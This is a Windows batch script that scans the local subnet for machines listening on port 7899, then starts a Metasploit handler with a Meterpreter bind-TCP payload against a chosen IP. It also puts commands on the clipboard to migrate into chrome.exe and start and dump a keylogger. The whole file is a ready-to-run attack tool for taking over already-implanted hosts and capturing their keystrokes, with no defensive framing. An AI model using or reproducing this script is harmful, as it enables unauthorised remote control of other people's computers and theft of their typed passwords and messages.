@echo off
title Control
:control
cls
for /f "tokens=2,3 delims={,}" %%a in ('"WMIC NICConfig where IPEnabled="True" get DefaultIPGateway /value | find "I" "') do set ipAddress=%%~a
nmap -sS -p 7899 %ipAddress%/24 | findstr /v "PORT     STATE  SERVICE" | findstr /v "closed" | findstr /v "filtered" | findstr /v "MAC" | findstr /v "Host" | findstr /v "done" | findstr /v "Starting" > "%temp%\temp__"
type "%temp%\temp__" | findstr /l "open" > nul
if errorlevel 1 echo No devices found & pause & goto control
type "%temp%\temp__"
:control1
echo.
set /p ip_target=Device IP:
if "%ip_target%"=="" goto control1
cls
echo use exploit/multi/handler > "%temp%\Listener"
echo set payload windows/meterpreter/bind_tcp >> "%temp%\Listener"
echo set LPORT 7899 >> "%temp%\Listener"
echo set EnableStageEncoding true >> "%temp%\Listener"
echo set RHOST %ip_target% >> "%temp%\Listener"
echo exploit >> "%temp%\Listener"
cmd /c "echo.migrate -N chrome.exe& echo.keyscan_start& echo.keyscan_dump" | clip
msfconsole -q -r "%temp%\Listener"